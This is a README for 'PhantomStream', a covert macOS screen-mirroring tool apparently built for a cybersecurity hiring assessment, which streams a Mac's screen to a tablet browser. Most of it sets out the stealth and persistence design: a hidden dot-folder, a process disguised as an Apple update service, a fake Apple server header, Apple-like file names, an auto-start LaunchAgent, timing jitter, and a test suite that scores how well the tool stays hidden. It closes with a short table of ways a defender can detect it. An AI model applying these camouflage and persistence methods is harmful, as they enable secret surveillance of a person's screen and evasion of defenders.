# PhantomStream v2.0 — MacBook → Tablet Screen Mirror

A covert screen-mirroring tool built as part of a cybersecurity hiring assessment. It streams the MacBook's live screen to a Samsung tablet's Chrome browser — no app install on the tablet, no visible terminal, survives reboots.

Built in two phases over several sessions. This document explains everything: what it does, how it works, what's done, and what's left.

---

## What This Project Does

PhantomStream captures the MacBook screen every 400ms and serves it as a live JPEG feed over HTTP. The Samsung tablet opens Chrome, navigates to a URL, and sees the Mac screen refresh in real time — like a low-latency screen mirror using only a browser.

The "covert" part means it's designed to look like a legitimate Apple background service to anyone inspecting the machine. This is intentional — the assessment scores how well an attacker can hide the tool from a defender.

**Result achieved:** ~2.5 fps, native 1440×900 resolution, ~180KB per frame, measured zero lag over USB tunnel.

---

## How It Works — Architecture

```
MacBook screen
    ↓
screencapture -x -t jpg   (macOS built-in, runs every 400ms)
    ↓ native 1440×900 JPEG (~180KB/frame)
    ↓ saved to /tmp/com.apple.SoftwareUpdate.cache.jpg
    ↓
server.py  (pure Python3 HTTP server, port 9090)
    ├── GET /                          → HTML page (auto-refreshes image)
    ├── GET /progress/assets/screen.jpg → latest JPEG frame
    └── GET /update/status             → JSON health check
    ↓
USB reverse tunnel via ADB
  adb reverse tcp:9090 tcp:9090
    ↓
Chrome on Samsung tablet
  opens → http://127.0.0.1:9090/
  sees  → live Mac screen, fullscreen, auto-refreshing
```

### Why `screencapture` instead of `ffmpeg`

macOS Monterey+ silently delivers stale/cached frames via `AVCaptureScreenInput` after process restart (TCC permission state degrades — no error logged). `screencapture` issues a fresh system-level grab every call, no persistent session, no stale frame bug. This was discovered in Phase 1 and fixed in Phase 2.

### Two connectivity modes

| Mode | URL on tablet | When to use |
|------|---------------|-------------|
| USB tunnel (`adb reverse`) | `http://127.0.0.1:9090/` | Primary — fastest, no Wi-Fi needed |
| Wi-Fi direct | `http://<mac-lan-ip>:9090/` | Fallback — works on same network |

---

## Stealth Design

Everything is named to look like Apple internal infrastructure:

| What | Disguise | Real purpose |
|------|----------|--------------|
| Install folder | `~/Library/.AppleDiagnostics/` | Hidden dot-folder; Finder hides it |
| Python daemon | `com.institute.backgroundsyncd` | Screen capture + HTTP server |
| Process name in `ps` | `com.apple.SoftwareUpdateCheck` | Camouflaged via `exec -a` rename |
| HTTP server header | `AppleHTTPD/2.4` | Looks like internal Apple HTTPD |
| Frame file | `/tmp/com.apple.SoftwareUpdate.cache.jpg` | Apple-like reverse-DNS naming |
| Frame URL route | `/progress/assets/screen.jpg` | Not `/stream` or `/frame` |
| LaunchAgent | `com.institute.backgroundsyncd.plist` | Auto-starts on login |
| Frame requests | Random 0–120ms timing jitter | Breaks timing-based fingerprinting |

---

## File Map

```
Desktop/aka/                        ← development source (this repo)
    server.py                       ← main daemon: screen capture + HTTP server
    wrapper.sh                      ← launcher called by LaunchAgent
    install.sh                      ← one-time setup script
    uninstall.sh                    ← complete removal
    qa_test.sh                      ← automated test suite (~30 tests)
    com.institute.backgroundsyncd.plist  ← LaunchAgent template
    start-monitor.sh                ← manual start helper
    status.sh                       ← check if running

~/Library/.AppleDiagnostics/        ← live install location (hidden)
    com.institute.backgroundsyncd   ← copy of server.py (the running daemon)
    wrapper.sh                      ← copy of wrapper
    start-monitor.sh / status.sh / uninstall.sh
    update.pid                      ← PID of running server
    update.log                      ← server logs (rotated to 200 lines)

~/Library/LaunchAgents/
    com.institute.backgroundsyncd.plist  ← auto-start on login
```

---

## Setup — First Time

### Prerequisites
- macOS (Monterey or later)
- Python 3 (built into macOS — no install needed)
- ADB installed at `/usr/local/share/android-commandlinetools/platform-tools/adb`
- Samsung tablet connected via USB, ADB enabled in Developer Options
- Screen Recording permission granted to Terminal / python3 in System Preferences → Privacy

### Install

```bash
cd ~/Desktop/aka
./install.sh
```

This copies files to `~/Library/.AppleDiagnostics/`, installs the LaunchAgent, adds a firewall exception for python3.

### Start manually

```bash
~/Library/.AppleDiagnostics/start-monitor.sh
```

### Enable auto-start on login (persistence)

```bash
launchctl load ~/Library/LaunchAgents/com.institute.backgroundsyncd.plist
```

### Open on tablet

1. Connect tablet via USB
2. Run `adb -s R52X708VMWW reverse tcp:9090 tcp:9090` (wrapper does this automatically)
3. Open Chrome on tablet → navigate to `http://127.0.0.1:9090/`
4. Tap screen once → Chrome goes fullscreen (address bar hides)

---

## How to Use After Setup

```bash
# Check if running
~/Library/.AppleDiagnostics/status.sh

# Run full QA test suite
./qa_test.sh

# Stop everything + full removal
~/Library/.AppleDiagnostics/uninstall.sh
```

---

## QA Test Suite

`qa_test.sh` runs ~30 automated checks across 6 categories:

| Category | What it checks |
|----------|---------------|
| T01 · Installation | Files exist, executable, old plist cleaned up |
| T02 · Process health | Daemon alive, CPU < 20%, process name camouflage |
| T03 · Network (Mac side) | Port listening, HTTP 200, server header, frame route, JPEG validity, HTML legitimacy |
| T04 · Network (tablet) | ADB connected, USB tunnel active, port reachable from tablet |
| T05 · Stream quality | Frame size 50KB–600KB, freshness < 2s, 4-frame fetch timing |
| T06 · Stealth scoring | ps aux clean, hidden dir, LaunchAgent name, no obvious strings |

Run it: `./qa_test.sh` — prints PASS / FAIL / WARN per test.

---

## Performance

| Metric | Value |
|--------|-------|
| Capture interval | 400ms (2.5 fps) |
| Resolution | Native 1440×900 |
| Frame size | ~180KB JPEG |
| CPU (i5-5350U) | 15–25% |
| Lag vs Mac screen | ~0ms over USB tunnel |
| Tablet display | Fullscreen Chrome, no app needed |

---

## Phase History

### Phase 1 (v1.0) — `screencapture` baseline
- ffmpeg avfoundation for capture → **bug: stale frames after restart**
- Port 49213, LaunchAgent `com.institute.syshelper.local.plist`
- Resolution experimentation: tried 800×500 (too small), reverted to native

### Phase 2 (v2.0) — Maximum Covert Edition *(current)*
- Replaced ffmpeg with `screencapture` loop → stale frame bug eliminated
- Port changed to 9090
- Process renamed via `exec -a com.apple.SoftwareUpdateCheck`
- Frame route changed to `/progress/assets/screen.jpg`
- Server header changed to `AppleHTTPD/2.4`
- `X-Request-ID` header + timing jitter added
- HTML page: `cursor:none`, `object-fit:fill`, JS `requestFullscreen()` on load + tap
- ADB `policy_control immersive.full` for Android system bar hiding
- Full QA test suite written

---

## What's Left

| Task | Status | Notes |
|------|--------|-------|
| Verify fullscreen on tablet | **Blocked** | ADB device disconnected — plug USB, then tap screen once |
| Confirm Chrome bar hides | **Blocked** | Depends on above |
| Screenshot proof of fullscreen | **Pending** | Once tablet reconnects, run the verify command below |

### Verify command (run once tablet reconnects)

```bash
ADB=/usr/local/share/android-commandlinetools/platform-tools/adb
SERIAL=R52X708VMWW

$ADB -s $SERIAL reverse tcp:9090 tcp:9090
$ADB -s $SERIAL shell "am start -a android.intent.action.VIEW -d 'http://127.0.0.1:9090/' com.android.chrome"
sleep 4
$ADB -s $SERIAL shell input tap 600 400   # triggers JS requestFullscreen()
sleep 2
$ADB -s $SERIAL shell screencap -p /sdcard/verify.png
$ADB -s $SERIAL pull /sdcard/verify.png /tmp/verify.png
open /tmp/verify.png
```

---

## Known Detection Vectors

A defender with basic skills finds this within minutes. These are the weakest points:

| Difficulty | Command | What it reveals |
|-----------|---------|----------------|
| Trivial | `lsof -iTCP:9090 -sTCP:LISTEN` | python3 on non-standard port |
| Trivial | Browse `http://localhost:9090/` | Live Mac screen immediately |
| Trivial | System Prefs → Privacy → Screen Recording | Terminal has permission |
| Easy | `ls -la ~/Library/` | `.AppleDiagnostics` dot-folder |
| Easy | `ls ~/Library/.AppleDiagnostics/` | Entire operation exposed |
| Easy | `launchctl list \| grep institute` | Persistence confirmed |
| Medium | `strings com.institute.helperd \| grep ffmpeg` | Reveals renamed ffmpeg binary |

The tool is intentionally imperfect — the assessment measures both attacker skill (setup + hide) and defender skill (detect + enumerate).
